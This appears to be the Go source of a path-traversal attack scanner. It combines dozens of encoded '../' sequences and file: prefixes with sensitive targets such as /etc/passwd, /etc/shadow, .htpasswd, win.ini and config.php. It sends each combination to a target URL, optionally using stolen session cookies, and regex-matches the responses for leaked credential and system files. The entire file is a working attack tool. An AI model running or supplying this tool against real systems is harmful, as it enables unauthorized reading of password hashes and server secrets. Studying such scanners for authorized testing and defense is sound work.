package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"

	"./utils"
)

var dotPatter = [...]string{"",
	"/..",
	"....//",
	"//....",
	"%252e%252e%255c",
	"%2e%2e%5c",
	"..%255c",
	"..%5c",
	"%5c../",
	"/%5c..",
	"..\\",
	"%2e%2e%2f",
	"../",
	"..%2f",
	"%2e%2e/",
	"%2e%2e%2f",
	"..%252f",
	"%252e%252e/",
	"%252e%252e%252f",
	"..%5c..%5c",
	"%2e%2e\\",
	"%2e%2e%5c",
	"%252e%252e\\",
	"%252e%252e%255c",
	"..%c0%af",
	"%c0%ae%c0%ae/",
	"%c0%ae%c0%ae%c0%af",
	"..%25c0%25af",
	"%25c0%25ae%25c0%25ae/",
	"%25c0%25ae%25c0%25ae%25c0%25af",
	"..%c1%9c",
	"%c0%ae%c0%ae\\",
	"%c0%ae%c0%ae%c1%9c",
	"..%25c1%259c",
	"%25c0%25ae%25c0%25ae\\",
	"%25c0%25ae%25c0%25ae%25c1%259c",
	"..%%32%66",
	"%%32%65%%32%65/",
	"%%32%65%%32%65%%32%66",
	"..%%35%63",
	"%%32%65%%32%65/",
	"%%32%65%%32%65%%35%63",
	"../",
	"...\\",
	"..../",
	"....\\",
	"........................................................................../",
	"..........................................................................\\",
	"..%u2215",
	"%uff0e%uff0e%u2215",
	"..%u2216",
	"..%uEFC8",
	"..%uF025",
	"%uff0e%uff0e\\",
	"%uff0e%uff0e%u2216",
}

var invertedPattern = []string{"",
	"./",
	"/",
	"\\",
	"",
	".\\",
	"file:",
	"file:/",
	"file://",
	"file:///",
}

var filesPattern = []string{
	"/etc/passwd",
	"windows/win.ini",
	"apache/logs/error.log",
	"apache/logs/access.log",
	"/etc/passwd",
	"c:WINDOWS/system32/",
	"install.php",
	"/config.asp",
	"/core/config.php",
	"admin/access_log",
	"root/.htpasswd",
	".htpasswd",
	"administrator/inbox",
	"dev",
	"/etc/passwd%00",
	"/etc/passwd",
	"etc/shadow%00",
	"etc/shadow",
}

func sendRequests(url string, cookies string) string {

	resp, err := http.Get(url)
	resp.Header.Add("Cookie", cookies)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	return string(body)
}

func validateInput(url string, endpoint string) {
	if url == "" {
		fmt.Println("[-] URL not defined.. ")
		os.Exit(0)
	}

	if endpoint == "" {
		fmt.Println("[-] endpoint not defined.. ")
		os.Exit(0)
	}
}

func validateURLendPoints(url string, endPoint string) {
	if !strings.Contains(url, endPoint) {
		fmt.Println("[-] Endpoint not found in URL !")
		os.Exit(0)
	}
}

func validateURL(url string) {
	if !strings.Contains(url, "http://") && !strings.Contains(url, "https://") {
		fmt.Println("[-] Provide a correct schema http:// or https://")
		os.Exit(1)
	}

}

func main() {

	utils.Banner()

	url := flag.String("url", "", "url from target")
	endPoint := flag.String("endpoint", "", "String in --url to attack. Ex: document.pdf")
	cookies := flag.String("cookies", "", "Cookies from authenticated path")
	goin := flag.Int("goin", 3, "max of recursive ../../../ default: 3")
	flag.Parse()

	// checking inputs
	validateInput(*url, *endPoint)
	validateURL(*url)
	validateURLendPoints(*url, *endPoint)

	// info prints
	fmt.Println("[+]TARGET: ", utils.SetColorBlue(*url))
	fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*endPoint))
	fmt.Println("[+]DEPH SET: ", *goin)
	if *cookies != "" {
		fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*cookies))
	}

	fmt.Println(utils.SetColorYela("[+] INIT REQUESTS [+]"))

	// regex to find
	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
	etcHosts := regexp.MustCompile(`(?m)^\s*([0-9.:]+)\s+([\w.-]+)`)
	htAcess := regexp.MustCompile(`AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile|IfModule`)
	etcShadow := regexp.MustCompile(`^[a-z0-9][a-z0-9]*::`)

	count := 0
	for count != (*goin + 1) {
		fmt.Println("[+] Depth: ", count)
		for _, pattern := range dotPatter {
			for _, inverted := range invertedPattern {
				for _, file := range filesPattern {
					st := strings.Repeat(pattern, count)
					fullPattern := inverted + st + file
					requestPattern := *url + fullPattern
					response := sendRequests(requestPattern, *cookies)

					// hell if's to make sure that pattern is finding :)
					matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
					if len(matchEtcPasswd) != 0 {
						fmt.Printf(utils.SetColorGreen("---> [+] ETC/PASSWD FOUND: %s\n payload: %s \n\n"), matchEtcPasswd[1], requestPattern)

					}

					matchEtcHosts := etcHosts.FindStringSubmatch(response)
					if len(matchEtcHosts) != 0 {
						fmt.Printf("---> [+] ETC/HOSTS: %s\n payload: %s \n\n", matchEtcHosts[1], requestPattern)
					}

					matchHtAcess := htAcess.FindStringSubmatch(response)
					if len(matchHtAcess) != 0 {
						fmt.Printf("---> [+] HTACESS FOUND: %s\n payload: %s\n\n", matchHtAcess[1], requestPattern)
					}

					matchShadow := etcShadow.FindStringSubmatch(response)
					if len(matchShadow) != 0 {
						fmt.Printf("---> [+] ETC/SHADOW FOUND: %s\n payload: %s\n\n", matchShadow[1], requestPattern)
					}

				}
			}
		}
		count++
	}
}
